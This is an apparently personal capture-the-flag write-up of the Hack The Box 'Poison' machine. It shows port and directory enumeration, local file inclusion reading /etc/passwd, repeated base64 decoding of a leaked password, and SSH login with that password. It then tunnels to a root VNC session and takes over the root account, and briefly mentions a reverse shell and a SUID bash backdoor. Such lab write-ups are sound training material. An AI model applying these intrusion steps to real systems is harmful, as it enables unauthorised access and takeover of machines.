# Introduction

---

Poison is a medium box, it is only rated 3.7, but hopefully it's still a good practise for the OSCP exam. This is one of the first machines I've done on HTB. Let's start enumerating the machine:

# Enumeration

---

## Nmap Scans

---

First, I performed a scan to simply enumerate which ports are open:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ sudo nmap -p- poison.htb -sS -o nmapAllPorts.txt -v
Warning: The -o option is deprecated. Please use -oN

```

Now, I perform a script scan on those 2 ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ sudo nmap -A poison.htb -o nmapDeep.txt -p 22,80

Since there is no vulnerability found for this version of OpenSSH, I can directly start to enumerate the webserver running on port 80.

## Enumeration Of Port 80

---

I start with a directory brute force. For this, I use gobuster:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ gobuster dir -u http://poison.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt

/browse.php           (Status: 200) [Size: 321]
```

I went to the page, the only interesting file is index.php (which redirects to browse.php). There are some files listed:

![Untitled](/assets/images/2021-09-22-Poison/Untitled.png)

The only useful is listfiles.php (I tried the other ones but nothing interesting was there):

```php
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
```

The last file is called `pwdbackup.txt`, I open it ([`http://poison.htb/browse.php?file=pwdbackup.txt`](http://poison.htb/browse.php?file=pwdbackup.txt)):

```
This password is secure, it's encoded atleast 15 times.. what could go wrong really..

```

The password will be encoded in the next section. I can also include local files, like `/etc/passwd`:

![Untitled](/assets/images/2021-09-22-Poison/Untitled1.png)

As you see, there is root and charix, which are the only users on the system that have a shell. This might be useful later when it comes to spawning shells.

# Encoding The Password

---

I wrote this script which writes each decoding iteration into a file:

```bash
#!/bin/bash
file="encode.txt"
rm "$file"
string="Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlh.....snip......"

encode(){
  string=$(echo -ne "$string" | base64 --decode)
  echo "Encoded $1:\n${string}" >> "$file"
}

for i in {0..20}
  do
     encode $i
 done
```

I run the script and it generates the following output (just a snip):

```bash
Encoded 11:\nQ2hhcml4ITIjNCU2JjgoMA==
Encoded 12:\nCharix!2#4%6&8(0
Encoded 13:\n
```

This means that the password is `Charix!2#4%6&8(0`. 

# Log In With SSH

---

I will try to login via SSH with the following credentials: `charix:Charix!2#4%6&8(0`:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ ssh charix@poison.htb                 
Password for charix@Poison:

Edit /etc/motd to change this login announcement.
Want to use sed(1) to edit a file in place?  Well, to replace every 'e' with
an 'o', in a file named 'foo', you can do:

        sed -i.bak s/e/o/g foo

And you'll get a backup of the original in a file named 'foo.bak', but if you
want no backup:

        sed -i '' s/e/o/g foo
charix@Poison:~ %
```

That worked, the log in as charix over SSH was successful.

## User Flag

---

With the shell over SSH I should be able to read the user flag:

```bash
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt
ea**************************209c
```

As you see, there is a zip file in the user directory, this could be used for privesc.

# Privilege Escalation

---

I connected via SCP to the machine and copied the zip file to my local machine. To crack the password, I will use John The Ripper, but before cracking the file, I try the password I already found:

```bash
charix@Poison:~ % unzip secret.zip -P Charix!2#4%6&8(0
charix@Poison:~ % ls -l
total 12
-r--r--r--  1 charix  charix    8 Jan 24  2018 secret
-rw-r-----  1 root    charix  166 Mar 19  2018 secret.zip
-rw-r-----  1 root    charix   33 Mar 19  2018 user.txt
charix@Poison:~ % chmod +x secret
```

That worked, but the the file inside is just a binary. So that does not help me at the moment. So I let linpeas do it's job. I found two things, a vnc process running as root and a writable path abuse:

```bash
╔══════════╣ PATH                                    
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses

asswd -rfbport 5901 -localhost -nolisten tcp :1
```

### Exploiting The Path

---

This Exploit will only work if you are not user charix, e.g. if you got a reverse shell using other exploits on the system and are now user www-data. Than you could use this attack vector to gain access as user charix. If you want to try this, you can upload a php reverse shell via SSH to the webserver and call it.

## VNC

---

Linpeas found a VNC process listening on localhost, so let's check all the listening ports:

```bash
charix@Poison:~ % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.17.28.48198      ESTABLISHED
tcp4       0      0 10.10.10.84.22         10.10.17.28.48196      ESTABLISHED
tcp4       0     44 10.10.10.84.22         10.10.17.28.47452      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

So the process is listening on port 5801 & 5901, that are default VNC ports. So I just need to redirect those ports over to my machine and connect to them via VNC. 

But there is one problem, I do not have a password for the root user. But maybe the file I found earlier is a vnc file, else it would not be called secret.

So let's redirect the ports. First, I check on which port my proxychain is listening:

```bash
┌──(user㉿KaliVM)-[/tools/LinPEAS]
└─$ tail /etc/proxychains4.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

So now, I redirect the port over to the proxychain (on port 9050):

```bash
┌──(user㉿KaliVM)-[/tools/LinPEAS]
└─$ ssh charix@poison.htb -D 9050
```

This should be everything that needed to be done in order to connect with VNC. I execute the VNC command over the proxychains including the secret file (which might be a password file for VNC):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ proxychains vncviewer 127.0.0.1:5901 -passwd secret
[proxychains] config file found: /etc/proxychains4.conf
```

This worked, so the file is actually a VNC connection file. A VNC window opened:

![Untitled](/assets/images/2021-09-22-Poison/Untitled2.png)

Since the VNC connection is established as root, I can open a root shell. I can change the password of root and may connect with root over SSH:

Root is already permitted to access over ssh:

![Untitled](/assets/images/2021-09-22-Poison/Untitled3.png)

With these informations and a password change, I should be able to SSH as root:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/poison]
└─$ ssh root@poison.htb
Password for root@Poison:

root@Poison:~ #
```

It would be better to just add another user with root permissions, so that the current root user keeps it's password. My attempt is easier and faster but the owner of the system will notice it.

You could also create a copy of /bin/bash and add the SUID bit to it.

## Root Flag

---

I should now be able to read the root flag:

```bash
root@Poison:~ # ls
.Xauthority     .cshrc          .history        .k5login        .login          .profile
.rnd            .ssh            .vim            .viminfo        .vnc            root.txt
root@Poison:~ # cat root.txt
71**************************61f5
```

# Conclusions

---

This was a fun box, I learned a lot. I think this box is a good practise for the OSCP exam. The box was pretty hard for me, because I haven't done many boxes before (this is one of my first write ups I wrote back in the day).

It was hard to not look into a write up when I was stuck, but I was able to solve it without one.
